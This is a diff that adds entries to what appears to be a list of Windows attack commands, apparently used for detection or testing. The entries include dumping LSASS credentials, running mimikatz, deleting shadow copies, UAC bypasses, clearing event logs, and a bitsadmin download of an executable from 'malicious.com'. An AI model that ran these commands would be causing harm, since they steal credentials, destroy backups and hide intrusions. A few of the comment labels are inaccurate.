@@ -152,3 +152,48 @@ schtasks /create /sc minute /mo 1 /tn "bad_task" /tr "cmd.exe /c powershell"
 ms-settings:shell
 bcdedit /set {default} safeboot minimal
 htmlapplication
+# SeBackupPrivilege Kullanımı
+reg save HKLM\SYSTEM system.hive
+
+# Telnet Reverse Shell
+telnet 192.168.1.1 4444
+
+# Credential Dumping with ProcDump
+procdump.exe -ma lsass.exe lsass.dmp
+
+# Handle.exe Process Enumeration
+handle.exe -a
+
+# Mimikatz with DLL Injection
+rundll32.exe mimikatz.dll,main
+
+# DNS Enumeration with Ping
+ping -n 10 192.168.1.1
+
+# Route.exe for Network Discovery
+route.exe print
+
+# Taskkill for Process Termination
+taskkill /F /IM malicious.exe
+
+# Regedit for Registry Modification
+regedit /s C:\malicious.reg
+
+# Scheduled Task Creation with schtasks
+schtasks /create /tn "MaliciousTask" /tr "C:\malicious.exe" /sc minute /mo 5
+
+# VSSAdmin Shadow Copy Deletion
+vssadmin delete shadows /all /quiet
+
+# Bypass UAC Using Event Viewer
+start ms-settings:shell
+
+# Bypass UAC Using Fodhelper
+start fodhelper.exe
+
+# Bitsadmin for File Transfer
+bitsadmin /transfer maliciousjob /download /priority high http://malicious.com/file.exe C:\malicious.exe
+
+# Wevtutil for Event Log Clearing
+wevtutil cl System
+
